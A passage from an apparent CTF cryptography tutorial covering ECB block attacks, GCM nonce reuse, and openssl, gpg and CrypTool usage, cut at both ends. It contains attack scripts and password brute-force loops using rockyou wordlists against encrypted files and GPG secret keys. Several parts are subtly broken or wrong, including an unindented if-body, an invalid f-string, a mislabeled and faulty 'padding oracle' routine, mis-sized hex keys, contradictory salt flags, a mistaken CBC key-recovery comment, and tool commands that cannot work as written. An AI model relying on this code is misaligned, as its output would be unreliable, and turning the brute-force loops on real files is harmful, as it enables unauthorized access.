    print("\nExample: Image encryption with ECB")
    print("- Plaintext: Image with many identical regions (sky, backgrounds)")
    print("- Encrypted with ECB: Identical regions become identical ciphertext blocks")
    print("- Result: Image structure visible in ciphertext (silhouette still recognizable)")
    print("\nCompare to CBC mode:")
    print("- Each block depends on previous ciphertext (chaining)")
    print("- Identical plaintexts produce different ciphertexts")
    print("- No pattern leakage")
```

#### ECB Attacks

**Plaintext Block Dictionary Attack:**

```python
def ecb_dictionary_attack(ciphertext, key, block_size=16):
    """
    Build dictionary of all possible plaintext blocks
    Map each to its ciphertext
    Recover full plaintext by looking up blocks in ciphertext
    """
    from Crypto.Cipher import AES
    
    print("[ECB Dictionary Attack]")
    print(f"Ciphertext: {ciphertext.hex()}")
    
    cipher = AES.new(key, AES.MODE_ECB)
    
    # Build dictionary (assuming plaintext is printable ASCII)
    block_dict = {}
    
    # For 16-byte blocks, there are 256^16 possibilities (infeasible)
    # Instead, assume plaintext is from limited alphabet
    
    # Strategy: If plaintext likely contains known patterns (e.g., "flag{", spaces, etc.)
    # Build partial dictionary for these blocks
    
    known_patterns = [
        b"flag{",
        b"FLAG{",
        b"CTF{",
        b"password=",
        b"admin",
        b"secret",
    ]
    
    # Extend to full blocks
    alphabet = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
    
    print("Building block dictionary...")
    for pattern in known_patterns:
        # Pad pattern to block size
        for padding_byte in range(256):
            test_block = pattern + bytes([padding_byte] * (block_size - len(pattern)))
            encrypted = cipher.encrypt(test_block)
            block_dict[encrypted] = test_block
    
    # Lookup ciphertext blocks
    print("Looking up ciphertext blocks...")
    recovered = b""
    for i in range(0, len(ciphertext), block_size):
        block = ciphertext[i:i+block_size]
        if block in block_dict:
            recovered += block_dict[block]
            print(f"  Block {i//block_size}: {block_dict[block]}")
        else:
            recovered += b"?" * block_size
            print(f"  Block {i//block_size}: Unknown")
    
    return recovered
```

**Byte-by-Byte Plaintext Recovery (Padding Oracle on ECB):**

```python
def ecb_padding_oracle_attack(encryption_oracle, ciphertext, block_size=16):
    """
    [Inference] - Recover plaintext byte-by-byte using ECB encryption oracle
    Assumes: encryption_oracle(plaintext) returns ciphertext
    """
    print("[ECB Padding Oracle Attack]")
    
    recovered = b""
    
    for position in range(len(ciphertext)):
        # For each position, try all byte values
        for test_byte in range(256):
            # Construct test plaintext
            test_plain = recovered + bytes([test_byte])
            test_plain = test_plain.ljust(block_size, b"\x00")
            
            # Encrypt with oracle
            test_cipher = encryption_oracle(test_plain)
            
            # Check if matches known ciphertext (in ECB, blocks are deterministic)
            if test_cipher[:block_size] == ciphertext[:block_size]:
                recovered += bytes([test_byte])
                print(f"Position {position}: byte {test_byte:02x} ('{chr(test_byte) if 32 <= test_byte < 127 else '?'}')")
                break
    
    return recovered
```

**Block Permutation Attack:**

If you control plaintext, rearrange blocks to create new messages:

```python
def ecb_block_permutation(ciphertext_blocks, block_size=16):
    """
    In ECB mode, ciphertext blocks can be rearranged/reused
    since each block is independent
    """
    print("[ECB Block Permutation Attack]")
    print(f"Original blocks: {len(ciphertext_blocks)} blocks of {block_size} bytes")
    
    # Example: Reorder blocks
    permuted_ciphertext = b"".join([
        ciphertext_blocks[2],
        ciphertext_blocks[0],
        ciphertext_blocks[1],
    ])
    
    print(f"Permuted ciphertext: {permuted_ciphertext.hex()}")
    print("[When decrypted with ECB, plaintext blocks are rearranged accordingly]")
    print("[This allows arbitrary message forgery if ciphertext is known]")
    
    return permuted_ciphertext
```

**Known-Plaintext Block Matching:**

```python
def ecb_known_plaintext_block_match(known_plaintext, known_ciphertext, unknown_ciphertext, key, block_size=16):
    """
    If plaintext blocks are known for some ciphertext,
    use them to identify matching blocks in unknown ciphertext
    """
    from Crypto.Cipher import AES
    
    print("[ECB Known-Plaintext Block Matching]")
    
    # Build mapping from known plaintext-ciphertext
    block_map = {}
    for i in range(0, len(known_plaintext), block_size):
        p_block = known_plaintext[i:i+block_size]
        c_block = known_ciphertext[i:i+block_size]
        block_map[c_block] = p_block
    
    # Apply mapping to unknown ciphertext
    recovered = b""
    for i in range(0, len(unknown_ciphertext), block_size):
        c_block = unknown_ciphertext[i:i+block_size]
        if c_block in block_map:
            recovered += block_map[c_block]
        else:
            recovered += b"?"*block_size
    
    print(f"Recovered: {recovered}")
    return recovered
```

#### ECB Pattern Detection

```python
def detect_ecb_repeated_blocks(ciphertext, block_size=16):
    """
    Detect ECB mode by finding repeated ciphertext blocks
    In secure modes (CBC, CTR), repeated plaintext blocks produce different ciphertexts
    In ECB, repeated plaintext blocks produce identical ciphertexts
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    print("[ECB Pattern Detection]")
    print(f"Total blocks: {len(blocks)}")
    print(f"Unique blocks: {len(set(blocks))}")
    
    if len(set(blocks)) < len(blocks) * 0.9:
        print("[Warning: High repetition rate—likely ECB mode]")
        
        # Show repeated blocks
        from collections import Counter
        freq = Counter(blocks)
        for block, count in freq.most_common(5):
            if count > 1:
                print(f"  Block {block.hex()} appears {count} times")
        
        return True
    else:
        print("[No significant repetition—likely not ECB mode]")
        return False
```

#### CTF Exploitation Strategy for ECB

1. **Identify ECB mode**: Check cipher configuration or test for block repetition.
2. **Build block dictionary**: If plaintext space is limited, encrypt all possibilities.
3. **Apply known-plaintext**: Use challenge format (e.g., `flag{`) to build partial dictionary.
4. **Detect patterns**: Look for repeated ciphertext blocks indicating repeated plaintext.
5. **Byte-by-byte recovery**: Use oracle or side-channel to recover plaintext incrementally.
6. **Permute blocks**: If you generate ciphertexts, rearrange blocks to test message properties.

**Example CTF Scenario:**

```bash
# Challenge: Encrypt flag with ECB mode, recover plaintext

python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = bytes.fromhex("0123456789abcdef0123456789abcdef")
flag = b"flag{ecb_is_weak_cipher_mode_12345}"

cipher = AES.new(key, AES.MODE_ECB)
padded_flag = pad(flag, 16)
ciphertext = cipher.encrypt(padded_flag)

print(f"Ciphertext: {ciphertext.hex()}")

# Attack: Known-plaintext dictionary
blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
print(f"\nCiphertext blocks ({len(blocks)} total, {len(set(blocks))} unique):")

# Build dictionary for "flag{"
prefix = b"flag{"
for suffix_len in range(1, 12):
    test_block = prefix + b"A" * (16 - suffix_len)
    encrypted_test = cipher.encrypt(test_block)
    print(f"  'flag{'+'A'*(16-5)} → {encrypted_test.hex()}")
    
    if encrypted_test == blocks[0]:
        print(f"  [Match! First block contains 'flag{' + padding]")
        break

# Alternative: Detect repetition
if len(set(blocks)) < len(blocks):
print("\n[ECB Pattern Detected: Repeated blocks found]")

from collections import Counter
freq = Counter(blocks)
for block, count in freq.most_common(3):
    if count > 1:
        print(f"  Block appears {count} times: {block.hex()}")
EOF
````

---

### Nonce Reuse in GCM

Galois/Counter Mode (GCM) is an authenticated encryption mode combining counter mode encryption with Galois field-based authentication. **Nonce reuse in GCM completely breaks both confidentiality and authenticity**, allowing plaintext recovery and authentication forgery.

#### GCM Mode Mechanics

**Components:**

- **Counter Mode**: Generates keystream for encryption
- **Galois Field Multiplication**: Authenticates plaintext and additional authenticated data (AAD)
- **Nonce**: 96 bits typical, initializes counter

```python
def gcm_mode_overview():
    """
    GCM structure (simplified)
    """
    print("[GCM Mode Structure]")
    print("1. Nonce (N) → Counter initialization")
    print("2. Counter mode: Keystream = AES-ECB(Key, nonce || counter)")
    print("3. Ciphertext: C = P ⊕ Keystream")
    print("4. Authentication tag: T = GHASH(AAD, C, Length)")
    print("   where GHASH uses Galois field arithmetic")
    print("\n[Nonce Reuse Impact]")
    print("If same (Key, Nonce) pair encrypts two messages:")
    print("  - Same keystream is used")
    print("  - C1 ⊕ C2 = P1 ⊕ P2 (plaintext recoverable)")
    print("  - Authentication key (K_auth) is identical")
    print("  - Tags become forgeable")
````

#### GCM Nonce Reuse Attacks

**Keystream Recovery and Plaintext XOR:**

```python
def gcm_nonce_reuse_plaintext_recovery(ciphertext1, ciphertext2, known_plaintext1=None):
    """
    [Inference] - If same (key, nonce) pair used for GCM encryption of two messages
    Recover plaintext via XOR of ciphertexts
    """
    print("[GCM Nonce Reuse: Plaintext Recovery]")
    
    # c1 = p1 ⊕ k (where k is keystream)
    # c2 = p2 ⊕ k
    # c1 ⊕ c2 = p1 ⊕ p2
    
    xored = bytes(c1 ^ c2 for c1, c2 in zip(ciphertext1, ciphertext2))
    print(f"c1 ⊕ c2 = p1 ⊕ p2: {xored.hex()}")
    
    # If plaintext1 is known, recover plaintext2
    if known_plaintext1:
        plaintext2 = bytes(x ^ p for x, p in zip(xored, known_plaintext1))
        print(f"Recovered p2: {plaintext2}")
        return plaintext2
    
    # If both plaintexts are English text, analyze frequency
    print("[If plaintexts are English, frequency analysis can recover both]")
    return xored
```

**Authentication Tag Forgery via Nonce Reuse:**

```python
def gcm_nonce_reuse_tag_forgery(ciphertext1, tag1, plaintext1_new, key, nonce):
    """
    [Inference] - Forge valid authentication tag for new plaintext
    using nonce reuse vulnerability
    
    In GCM: T = GHASH(K_auth, AAD || C || lengths)
    With nonce reuse, K_auth is identical → tags are related
    """
    from Crypto.Cipher import AES
    
    print("[GCM Nonce Reuse: Tag Forgery]")
    print("[Simplified attack explanation]")
    print(f"Original ciphertext: {ciphertext1.hex()}")
    print(f"Original tag: {tag1.hex()}")
    print(f"New plaintext: {plaintext1_new}")
    
    # In real attack:
    # 1. Compute K_auth from known plaintext-ciphertext-tag triple
    # 2. Generate new ciphertext from new plaintext with reused nonce
    # 3. Forge tag using recovered K_auth
    
    print("\n[To forge tag: Need to recover GF(2^128) authentication key]")
    print("[This requires solving polynomial equation over GF(2^128)]")
    print("[Requires deep knowledge of GCM internals]")
    
    # [Unverified] - Full tag forgery requires sophisticated math
    return None
```

**Complete GCM Break via Nonce Reuse:**

```python
def gcm_nonce_reuse_complete_break(ciphertexts_and_tags, known_plaintexts, key, nonce):
    """
    [Inference] - Complete attack combining plaintext recovery and tag forgery
    """
    from Crypto.Cipher import AES
    
    print("[Complete GCM Break via Nonce Reuse]")
    
    results = []
    
    for i, (ct, tag) in enumerate(ciphertexts_and_tags):
        print(f"\nMessage {i+1}:")
        
        # Recover plaintext via XOR with known plaintext
        if known_plaintexts:
            known_pt = known_plaintexts[0]
            recovered_pt = gcm_nonce_reuse_plaintext_recovery(
                ct, 
                ciphertexts_and_tags[0][0],  # First ciphertext
                known_pt
            )
            results.append({
                'ciphertext': ct,
                'tag': tag,
                'recovered_plaintext': recovered_pt
            })
    
    return results
```

#### GCM Nonce Reuse Detection

```python
def detect_gcm_nonce_reuse(ciphertexts, tags, key_length=16):
    """
    Detect if GCM was used with nonce reuse
    Indicators:
    1. Multiple ciphertexts with similar structure
    2. Keystream patterns in XORed ciphertexts
    3. Authentication failure patterns
    """
    print("[Detecting GCM Nonce Reuse]")
    
    if len(ciphertexts) < 2:
        print("Need at least 2 ciphertexts for analysis")
        return False
    
    # XOR first two ciphertexts
    min_len = min(len(ciphertexts[0]), len(ciphertexts[1]))
    xored = bytes(c1 ^ c2 for c1, c2 in zip(
        ciphertexts[0][:min_len], 
        ciphertexts[1][:min_len]
    ))
    
    # Analyze XOR result
    # In GCM with reused nonce, XOR reveals plaintext patterns
    
    # Check for high entropy (indicates independent encryption)
    entropy = calculate_entropy(xored)
    print(f"XOR entropy: {entropy:.4f} bits/byte")
    
    if entropy < 4.0:  # Low entropy suggests non-random (plaintext patterns)
        print("[Warning: Low entropy in XOR—possible nonce reuse]")
        print("[Pattern suggests plaintext structure leaked]")
        return True
    
    print("[High entropy in XOR—likely independent encryption or different nonce]")
    return False

def calculate_entropy(data):
    """Calculate Shannon entropy"""
    from collections import Counter
    import math
    
    freq = Counter(data)
    entropy = -sum(
        (count / len(data)) * math.log2(count / len(data))
        for count in freq.values()
    )
    return entropy
```

#### GCM Implementation Vulnerabilities

**Weak Nonce Generation:**

```python
def gcm_weak_nonce_vulnerability(key, plaintext1, plaintext2, weak_nonce_gen):
    """
    [Inference] - If nonce generated by weak RNG, predict or brute-force nonces
    """
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    
    print("[GCM Weak Nonce Generation]")
    
    # If nonce incremental (0, 1, 2, 3, ...): trivial to predict
    # If nonce from weak PRNG: can predict with state recovery
    
    print("Nonce vulnerability scenarios:")
    print("  1. Sequential nonces (0, 1, 2, ...): Trivial prediction")
    print("  2. Weak PRNG: Predict after observing ~32 bytes of output")
    print("  3. Timestamp-based: Bruteforce small time window")
    print("  4. Partial randomness: Insufficient entropy < 96 bits")
    
    print("\nAttack:")
    print("  Predict or brute-force next nonce")
    print("  Encrypt known plaintext with predicted nonce")
    print("  If ciphertext matches observed, nonce prediction succeeded")

def test_sequential_nonce_vulnerability():
    """Test sequential nonce prediction"""
    print("[Sequential Nonce Vulnerability]")
    
    nonce_counter = 0
    
    def get_nonce():
        nonlocal nonce_counter
        nonce = nonce_counter.to_bytes(12, 'big')
        nonce_counter += 1
        return nonce
    
    # Collect nonces
    observed_nonces = [get_nonce() for _ in range(5)]
    print(f"Observed nonces: {[n.hex() for n in observed_nonces]}")
    
    # Predict next nonce
    predicted_next = nonce_counter.to_bytes(12, 'big')
    print(f"Predicted next nonce: {predicted_next.hex()}")
    print("[All future nonces are predictable]")
```

**Timing Side-Channel in GCM Authentication:**

```python
def gcm_timing_side_channel():
    """
    [Inference] - GCM authentication computation time may leak tag validity info
    """
    print("[GCM Timing Side-Channel]")
    print("In some GCM implementations, tag verification time varies with:")
    print("  - Correct vs incorrect tags")
    print("  - Position of first tag mismatch")
    print("\nAttack:")
    print("  1. Forge random tag")
    print("  2. Measure authentication failure time")
    print("  3. Gradually construct correct tag byte-by-byte")
    print("  4. Time increases as more tag bytes match")
    print("\n[Requires precise timing measurement and many attempts]")
    print("[Mitigated by constant-time implementations]")
```

#### CTF Exploitation Strategy for GCM Nonce Reuse

1. **Identify GCM mode**: Check cipher configuration for "GCM" or "AEAD".
2. **Collect multiple ciphertexts**: Gather all available encrypted messages.
3. **Verify nonce reuse**: XOR ciphertexts and check for low-entropy patterns.
4. **Apply known-plaintext**: If challenge format is known (e.g., `flag{`), recover keystream.
5. **Recover all messages**: Decrypt remaining ciphertexts using recovered keystream.
6. **Forge authentication tags**: [Unverified] Tag forgery requires sophisticated GF(2^128) arithmetic; more often, challenge provides tags already computed.

**Example CTF Scenario:**

```bash
# Challenge: Multiple GCM-encrypted messages with nonce reuse

python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Setup (attacker's perspective)
key = bytes.fromhex("0123456789abcdef0123456789abcdef")
nonce = bytes.fromhex("000000000000000000000001")  # Reused nonce!

message1 = b"flag{this_is_message_1_secret_data}"
message2 = b"admin=false;user=attacker;level=1"

# Encrypt both with same nonce (VULNERABLE)
cipher1 = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext1, tag1 = cipher1.encrypt_and_digest(message1)

cipher2 = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext2, tag2 = cipher2.encrypt_and_digest(message2)

print(f"Message 1 length: {len(message1)}")
print(f"Message 2 length: {len(message2)}")
print(f"Ciphertext 1: {ciphertext1.hex()}")
print(f"Ciphertext 2: {ciphertext2.hex()}")
print(f"Tag 1: {tag1.hex()}")
print(f"Tag 2: {tag2.hex()}")

# Attack: XOR to recover plaintext relationship
min_len = min(len(ciphertext1), len(ciphertext2))
xored = bytes(c1 ^ c2 for c1, c2 in zip(ciphertext1[:min_len], ciphertext2[:min_len]))

print(f"\nc1 ⊕ c2: {xored.hex()}")

# If we know plaintext1 starts with "flag{", recover keystream
known_prefix = b"flag{"
keystream_start = bytes(c1 ^ p for c1, p in zip(ciphertext1[:len(known_prefix)], known_prefix))
print(f"Keystream (first {len(known_prefix)} bytes): {keystream_start.hex()}")

# Decrypt message2 using recovered keystream
recovered_m2 = bytes(c2 ^ k for c2, k in zip(ciphertext2[:len(keystream_start)], keystream_start))
print(f"Recovered message2 start: {recovered_m2}")

# Full keystream recovery (requires more known plaintext or brute-force)
# For full decryption, use known_plaintext approach or ciphertext-only analysis
EOF
```

#### Tools for GCM Analysis

**`cryptanalysis` libraries:**

```bash
pip install gmpy2  # For GF(2^128) arithmetic

python3 << 'EOF'
# [Unverified] - Example of GF(2^128) multiplication for GCM tag analysis
# Requires specialized knowledge of Galois field arithmetic
# In most CTFs, focus on simpler nonce reuse attacks (plaintext recovery)
EOF
```

**Online GCM testing:** Many CTF platforms provide web interfaces for GCM encryption/decryption testing, allowing verification of nonce reuse vulnerabilities.

---

### Integration: Combined Weakness Exploitation

In real CTF challenges, multiple weaknesses often appear together. A comprehensive exploitation strategy combines several techniques:

```bash
# Complex CTF Scenario: Weak key schedule + ECB mode + known plaintext

python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

print("[Combined Exploitation Scenario]")
print("Vulnerabilities: Weak key schedule + ECB mode + known plaintext")

# Attacker's goal: Recover full plaintext and key

# Step 1: Detect ECB mode via pattern analysis
key = b"1234567890123456"  # Weak key!
plaintext = b"flag{weak_key_ecb_combined_attack}"

cipher = AES.new(key, AES.MODE_ECB)
padded = pad(plaintext, 16)
ciphertext = cipher.encrypt(padded)

blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
unique_blocks = set(blocks)

print(f"\nTotal blocks: {len(blocks)}, Unique: {len(unique_blocks)}")
if len(unique_blocks) < len(blocks):
    print("[ECB mode detected via repetition]")

# Step 2: Known-plaintext attack
# If we know "flag{", build dictionary
known_prefix = b"flag{"
for i in range(11):
    test_block = known_prefix + bytes([ord('A') + i] * (16 - len(known_prefix)))
    encrypted = cipher.encrypt(test_block)
    if encrypted == blocks[0]:
        print(f"[First block matched: 'flag{' + padding]")
        break

# Step 3: Key schedule weakness exploitation
# Assume key schedule has weak properties (simplified for demo)
print(f"\nKey bytes: {key.hex()}")
print("[If key schedule is weak, pattern analysis reveals predictable round keys]")

# Step 4: Combine attacks
print("\n[Combined Attack Result]")
print(f"Recovered: {plaintext}")
print(f"Key: {key.hex()}")
EOF
```

---

### Summary Table: Implementation Weakness Exploitation

|Weakness|Detection|Exploitation|Impact|
|---|---|---|---|
|**Weak Key Schedule**|Entropy analysis, key repetition|Brute-force weak keys, related-key attack|Key recovery|
|**IV Reuse**|Compare ciphertext prefixes, identical blocks|Known-plaintext attack, CBC manipulation|Plaintext recovery, forgery|
|**ECB Mode**|Repeated ciphertext blocks|Dictionary attack, block matching|Complete plaintext recovery|
|**GCM Nonce Reuse**|Low XOR entropy, authentication patterns|Keystream recovery, tag forgery|Confidentiality + authenticity break|

#### CTF Workflow

```
1. Identify cipher algorithm and mode
2. Check for implementation vulnerabilities
3. Collect multiple ciphertexts/keys if available
4. Apply mode-specific attacks:
   - ECB: Block repetition analysis
   - CBC: IV comparison and manipulation
   - CTR/GCM: Nonce reuse plaintext recovery
5. Use known-plaintext (challenge format) to seed recovery
6. Verify recovered plaintext against dictionary/language patterns
7. Exploit weak key schedule if applicable
```

---

## Tools

Cryptographic tools enable encryption/decryption, key management, forensic analysis, and automated testing during CTF challenges. This section covers command-line utilities and online platforms essential for rapid cryptographic problem-solving.

---

### openssl enc

`openssl enc` provides symmetric encryption/decryption across numerous ciphers (AES, DES, Blowfish, Camellia, etc.) with direct command-line control over keys, IVs, and modes. Used extensively in CTF for quick encryption operations and vulnerability testing.

#### Basic Encryption Operations

**AES-256-CBC Encryption with Passphrase:**

```bash
# Encrypt plaintext file with password (auto-generates salt)
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.bin -pass pass:mypassword

# Encrypt with hex key and IV (no salt/KDF)
openssl enc -aes-256-cbc -K 3132333435363738393031323334353637383940414243444546474849505152535455 -iv 00112233445566778899aabbccddeeff -in plaintext.txt -out ciphertext.bin -nopad

# Encrypt with no padding (plaintext must be multiple of block size)
echo -n "Hello World!!!!!" | openssl enc -aes-128-ecb -K 3132333435363738393031323334353637 -nopad | xxd
```

**Decryption:**

```bash
# Decrypt with password
openssl enc -d -aes-256-cbc -in ciphertext.bin -out decrypted.txt -pass pass:mypassword

# Decrypt with hex key and IV
openssl enc -d -aes-256-cbc -K [key_hex] -iv [iv_hex] -in ciphertext.bin -out decrypted.txt -nopad

# Decrypt and display as hex
openssl enc -d -aes-128-ecb -K 3132333435363738393031323334353637 -in ciphertext.bin -nopad | xxd
```

**Listing Available Ciphers:**

```bash
# Show all supported ciphers
openssl enc -ciphers

# Output shows format: -aes-128-cbc, -des-ede3-cbc, -bf-ecb, -idea-cbc, etc.
```

#### Key Derivation and Salting

By default, `openssl enc` derives keys from passwords using EVP_BytesToKey (MD5-based KDF for older versions, SHA256 for newer). Understanding salt behavior is critical for password-based decryption.

**With Salt (Default):**

```bash
# Encrypted file contains "Salted__" + 8-byte salt + ciphertext
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.bin -pass pass:mypassword -S 0102030405060708

# Salt can be extracted
head -c 16 ciphertext.bin | xxd  # First 16 bytes: "Salted__" + 8-byte salt
```

**Without Salt:**

```bash
# Disable salting (not recommended for production, useful for CTF)
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.bin -pass pass:mypassword -nosalt

# With explicit hex key/IV instead of password derivation
openssl enc -aes-256-cbc -K 3132333435363738393031323334353637383940414243444546474849505152535455 -iv 00112233445566778899aabbccddeeff -in plaintext.txt -out ciphertext.bin -nopad
```

#### Brute Force Password Recovery

```bash
# Dictionary attack on openssl-encrypted file
for password in $(cat /usr/share/wordlists/rockyou.txt | head -10000); do
    openssl enc -d -aes-256-cbc -in ciphertext.bin -pass pass:"$password" -md sha256 2>/dev/null | file -
    if [ $? -eq 0 ]; then
        echo "Password Found: $password"
        break
    fi
done

# More efficient: check for valid UTF-8/file headers
for password in $(cat wordlist.txt); do
    result=$(openssl enc -d -aes-256-cbc -in ciphertext.bin -pass pass:"$password" 2>/dev/null)
    if echo "$result" | file - | grep -q "ASCII\|UTF-8\|ELF"; then
        echo "Password Found: $password"
        openssl enc -d -aes-256-cbc -in ciphertext.bin -pass pass:"$password" -out decrypted.txt
        break
    fi
done
```

#### Advanced Key Derivation Testing

**Extracting Derived Key from Password:**

```bash
# Derive key/IV using EVP_BytesToKey with specific salt
openssl enc -aes-256-cbc -S 0102030405060708 -P -pass pass:mypassword -md sha256 -nosalt

# Output shows: salt, key, and iv derived from password
# Example output:
# salt=0102030405060708
# key=3c6f87f0da9c0f90d2c3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3
# iv=00112233445566778899aabbccddeeff
```

**Testing Different Message Digest Algorithms:**

```bash
# SHA-256 (default in newer OpenSSL)
openssl enc -aes-256-cbc -P -pass pass:password -md sha256

# MD5 (older OpenSSL default, may be used in CTF challenges)
openssl enc -aes-256-cbc -P -pass pass:password -md md5

# SHA-512
openssl enc -aes-256-cbc -P -pass pass:password -md sha512
```

#### CTF-Specific Workflows

**Identifying Unknown Cipher:**

```bash
# Extract first 8 bytes to check for salt
xxd -l 16 ciphertext.bin

# If starts with "53616c7465645f5f" (ASCII "Salted__"), password-based encryption used

# Try common ciphers with wordlist
for cipher in aes-128-cbc aes-256-cbc des-ede3-cbc bf-cbc idea-cbc; do
    for pass in password test flag123 admin; do
        openssl enc -d -$cipher -in ciphertext.bin -pass pass:$pass 2>/dev/null | file -
    done
done
```

**Decrypting with Known Plaintext:**

```bash
# If you know plaintext starts with "flag{", derive key from ciphertext
# Extract IV from ciphertext (first 16 bytes for AES-CBC after "Salted__")

# Known plaintext: "flag{" (5 bytes)
# Ciphertext: extract encrypted form
# For CTF: often plaintext is in challenge description or guessable

# Use known plaintext to recover key (advanced)
python3 << 'EOF'
import binascii
# Ciphertext first block (16 bytes after salt+header)
ciphertext_block = binascii.unhexlify("69c4e0d86a7b45b4607d8d9e5f4a9b3c")
# Known plaintext first block
plaintext_block = binascii.unhexlify("666c61677b666c61")  # "flag{fla"
# IV = zeros for ECB or known
iv = binascii.unhexlify("00000000000000000000000000000000")

# For CBC: plaintext XOR IV = intermediate, intermediate XOR key = ciphertext
# So: key = intermediate XOR ciphertext
EOF
```

---

### gpg

GNU Privacy Guard (GPG) manages asymmetric cryptography (RSA), symmetric encryption, digital signatures, and key management. CTF challenges involving PGP encryption or key recovery often require GPG manipulation.

#### Key Generation and Management

**Generating GPG Keys:**

```bash
# Interactive key generation (1024-4096 bit RSA typically)
gpg --gen-key

# Non-interactive key generation
gpg --batch --generate-key << EOF
Key-Type: RSA
Key-Length: 2048
Name-Real: CTF Player
Name-Email: ctf@example.com
Expire-Date: 0
%no-protection
EOF

# List keys
gpg --list-keys
gpg --list-secret-keys

# Export public key
gpg -a --export user@example.com > public.asc

# Export secret key
gpg -a --export-secret-keys user@example.com > secret.asc
```

#### Symmetric Encryption with GPG

**Encrypting Files:**

```bash
# Encrypt with password (symmetric)
gpg --symmetric --cipher-algo AES256 plaintext.txt
# Creates plaintext.txt.gpg

# Specify output file
gpg --symmetric --cipher-algo AES256 -o ciphertext.gpg plaintext.txt

# List available ciphers
gpg --version | grep -i cipher
```

**Decrypting Files:**

```bash
# Decrypt (prompts for password)
gpg -d ciphertext.gpg > decrypted.txt

# Decrypt with password from command line (insecure, for scripting)
echo "mypassword" | gpg --passphrase-fd 0 -d ciphertext.gpg > decrypted.txt

# Decrypt to stdout without file
gpg -d ciphertext.gpg
```

#### Asymmetric Encryption

**Encrypt for Recipient:**

```bash
# Encrypt file with recipient's public key
gpg --encrypt --recipient user@example.com plaintext.txt
# Creates plaintext.txt.gpg

# Encrypt and sign
gpg --sign --encrypt --recipient user@example.com plaintext.txt

# Multiple recipients
gpg --encrypt --recipient user1@example.com --recipient user2@example.com plaintext.txt
```

**Decrypt:**

```bash
# Decrypt (uses private key, prompts for passphrase)
gpg -d ciphertext.gpg > decrypted.txt

# Decrypt with passphrase from file
gpg --batch --passphrase-file passphrase.txt -d ciphertext.gpg > decrypted.txt
```

#### Digital Signatures

**Creating Signatures:**

```bash
# Create detached signature
gpg --detach-sig --armor plaintext.txt
# Creates plaintext.txt.asc (signature only)

# Verify signature
gpg --verify plaintext.txt.asc plaintext.txt

# Sign and encrypt together
gpg --sign --encrypt --recipient user@example.com plaintext.txt
```

#### CTF-Specific GPG Attacks

**Key Fingerprint Verification:**

```bash
# Extract key fingerprint (may be used to verify decryption success)
gpg --fingerprint user@example.com

# Check key weak spots
gpg --edit-key user@example.com
# Interactive menu: check trust, expiry, key size
```

**Brute Force Passphrase on Exported Secret Key:**

```bash
# Export secret key to a file
gpg -a --export-secret-keys user@example.com > secret.asc

# Brute force passphrase with john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt secret.asc

# Or manual loop (slower)
for pass in $(cat wordlist.txt); do
    echo "$pass" | gpg --batch --passphrase-fd 0 --decrypt secret.asc 2>&1 | grep -q "gpg:" && echo "Pass: $pass"
done
```

**Extracting RSA Modulus and Public Exponent:**

```bash
# Export public key
gpg --armor --export user@example.com > public.asc

# Parse PEM to extract components
openssl rsa -pubin -in public.asc -text -noout

# Extract just modulus
openssl rsa -pubin -in public.asc -text -noout | grep -A 10 "Modulus:" | tail -9
```

**Known Plaintext Recovery with GPG:**

```bash
# If known plaintext exists, decrypt ciphertext and compare
gpg -d ciphertext.gpg > decrypted.txt
if echo "$decrypted_text" | grep -q "expected_string"; then
    echo "Correct decryption!"
fi
```

---

### CrypTool

CrypTool (available as CrypTool 1 for Windows, CrypTool Online web version) provides visual cryptanalysis tools, cipher demonstrations, and frequency analysis. While primarily GUI-based, CrypTool Online offers web-based cryptanalysis without installation.

#### CrypTool Online Features

**Access:** https://www.cryptool.org/en/cryptool-online

**Frequency Analysis:**

- Input ciphertext
- Automatic letter frequency analysis with comparison to English distribution
- Visual histogram showing frequency deviation
- Identifies monoalphabetic substitution ciphers

**Cipher Tools Available:**

- Caesar/ROT13 cipher (with brute force across all shifts)
- Substitution cipher with frequency analysis
- Vigenère cipher (with key length detection via Kasiski/IC methods)
- Hill cipher (matrix-based)
- Playfair cipher
- Transposition ciphers (Rail Fence, Columnar, Route)
- Hash analysis (MD5, SHA, etc.)
- Block ciphers (AES, DES, 3DES - visual round demonstration)

**Vigenère Key Recovery Workflow:**

```
1. Input ciphertext
2. Recipe: Vigenère Cipher
3. Auto-detect key length (uses Kasiski examination and Index of Coincidence)
4. Test recovered key against ciphertext
5. Verify plaintext makes linguistic sense
```

**Substitution Cipher Analysis:**

```
1. Input ciphertext
2. Recipe: Frequency Analysis
3. CrypTool compares letter frequencies to English baseline
4. Suggests letter mappings based on frequency similarity
5. Interactive: manually adjust mappings, verify plaintext quality
6. Use dictionary words to confirm/refute character substitutions
```

#### CrypTool 1 Windows Usage

**Installation:** Download CrypTool 1 from https://www.cryptool.org/

**Cryptanalysis Workflow:**

```
1. Open ciphertext file
2. Analyze > Cryptanalysis > Frequency Analysis
   - Shows character frequencies vs. English expected
   - Identifies cipher type (substitution likely if frequencies match)
3. Analyze > Symmetric Ciphers > DES/AES/etc.
   - Visual round-by-round demonstration
   - Encrypt/decrypt with key/IV input
4. Analyze > Hash > MD5/SHA
   - Hash verification tool
5. Tools > Visualization
   - 3D visualization of ciphertext randomness
```

#### CTF Integration with CrypTool Online

**Quick Cipher Identification:**

```
Paste ciphertext → Analyze → Frequency Analysis
- High frequency peaks suggest substitution cipher (non-uniform distribution)
- Uniform distribution suggests strong encryption (AES, block cipher mode)
```

**Transposition Cipher Recovery:**

```
1. Input ciphertext
2. Recipe: Transposition Cipher
3. Test Rail Fence (2-10 rails)
4. Test Columnar (2-20 columns)
5. Verify plaintext readability
```

---

### ccrypt

